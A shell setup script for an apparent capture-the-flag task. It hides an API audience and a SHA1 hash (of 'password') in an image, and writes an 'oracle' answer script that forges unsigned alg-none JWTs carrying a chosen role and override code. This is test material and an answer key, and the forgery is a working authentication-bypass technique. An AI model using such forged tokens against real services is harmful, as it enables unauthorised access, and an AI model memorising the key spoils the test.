#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip
    pip3 install pytest Pillow

    mkdir -p /app

    # Create the image with hidden ground truth
    python3 -c "
from PIL import Image, ImageDraw
img = Image.new('RGB', (800, 100), color = (255, 255, 255))
d = ImageDraw.Draw(img)
d.text((10, 10), 'Target API aud: internal-fuzz-api-v2. Emergency override hash (SHA1): 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', fill=(0, 0, 0))
img.save('/app/dev_notes.png')
"

    # Create the oracle script
    cat << 'EOF' > /app/oracle_forge.py
#!/usr/bin/env python3
import sys
import json
import base64

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

if len(sys.argv) != 3:
    sys.exit(1)

username = sys.argv[1]
role_id = int(sys.argv[2])

header = {"typ": "JWT", "alg": "none"}
payload = {
    "user": username,
    "role": role_id,
    "aud": "internal-fuzz-api-v2",
    "override_code": "password"
}

encoded_header = b64url_encode(json.dumps(header, separators=(',', ':')))
encoded_payload = b64url_encode(json.dumps(payload, separators=(',', ':')))

print(f"{encoded_header}.{encoded_payload}.")
EOF
    chmod +x /app/oracle_forge.py

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
